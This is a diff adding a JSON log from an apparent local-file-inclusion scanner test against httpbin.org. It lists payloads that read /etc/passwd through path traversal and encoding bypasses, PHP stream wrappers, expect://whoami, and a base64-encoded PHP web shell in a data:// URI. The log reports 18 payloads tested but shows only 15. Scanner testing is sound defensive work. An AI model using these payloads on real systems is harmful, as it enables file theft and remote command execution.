@@ -1,0 +1,144 @@
+{
+  "tool": "lfi_scan",
+  "timestamp": "20260710_115653",
+  "session_id": "test_validation_20260710_115508",
+  "inputs": {
+    "url": "https://httpbin.org/get",
+    "param": "file"
+  },
+  "outputs": {
+    "status": "success",
+    "target": "https://httpbin.org/get",
+    "parameter": "file",
+    "payloads_tested": 18,
+    "vulnerable": false,
+    "summary": {
+      "total_tested": 18,
+      "vulnerable": 0,
+      "file_types_found": []
+    },
+    "vulnerable_payloads": [],
+    "all_results": [
+      {
+        "payload": "../../../../etc/passwd",
+        "vulnerable": false,
+        "file_type": null,
+        "indicators_found": [],
+        "response_length": 155,
+        "confidence": "low"
+      },
+      {
+        "payload": "....//....//....//etc/passwd",
+        "vulnerable": false,
+        "file_type": null,
+        "indicators_found": [],
+        "response_length": 0,
+        "confidence": "low"
+      },
+      {
+        "payload": "..%2F..%2F..%2F..%2Fetc%2Fpasswd",
+        "vulnerable": false,
+        "file_type": null,
+        "indicators_found": [],
+        "response_length": 155,
+        "confidence": "low"
+      },
+      {
+        "payload": "..%252F..%252F..%252Fetc%252Fpasswd",
+        "vulnerable": false,
+        "file_type": null,
+        "indicators_found": [],
+        "response_length": 358,
+        "confidence": "low"
+      },
+      {
+        "payload": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+        "vulnerable": false,
+        "file_type": null,
+        "indicators_found": [],
+        "response_length": 0,
+        "confidence": "low"
+      },
+      {
+        "payload": "....\\/....\\/....\\/etc/passwd",
+        "vulnerable": false,
+        "file_type": null,
+        "indicators_found": [],
+        "response_length": 155,
+        "confidence": "low"
+      },
+      {
+        "payload": "..%c0%af..%c0%af..%c0%afetc/passwd",
+        "vulnerable": false,
+        "file_type": null,
+        "indicators_found": [],
+        "response_length": 155,
+        "confidence": "low"
+      },
+      {
+        "payload": "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",
+        "vulnerable": false,
+        "file_type": null,
+        "indicators_found": [],
+        "response_length": 155,
+        "confidence": "low"
+      },
+      {
+        "payload": "/etc/passwd%00",
+        "vulnerable": false,
+        "file_type": null,
+        "indicators_found": [],
+        "response_length": 155,
+        "confidence": "low"
+      },
+      {
+        "payload": "/etc/passwd%00.jpg",
+        "vulnerable": false,
+        "file_type": null,
+        "indicators_found": [],
+        "response_length": 155,
+        "confidence": "low"
+      },
+      {
+        "payload": "php://filter/convert.base64-encode/resource=/etc/passwd",
+        "vulnerable": false,
+        "file_type": null,
+        "indicators_found": [],
+        "response_length": 155,
+        "confidence": "low"
+      },
+      {
+        "payload": "php://filter/read=string.rot13/resource=/etc/passwd",
+        "vulnerable": false,
+        "file_type": null,
+        "indicators_found": [],
+        "response_length": 155,
+        "confidence": "low"
+      },
+      {
+        "payload": "php://input",
+        "vulnerable": false,
+        "file_type": null,
+        "indicators_found": [],
+        "response_length": 0,
+        "confidence": "low"
+      },
+      {
+        "payload": "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=",
+        "vulnerable": false,
+        "file_type": null,
+        "indicators_found": [],
+        "response_length": 0,
+        "confidence": "low"
+      },
+      {
+        "payload": "expect://whoami",
+        "vulnerable": false,
+        "file_type": null,
+        "indicators_found": [],
+        "response_length": 316,
+        "confidence": "low"
+      }
+    ]
+  }
+}
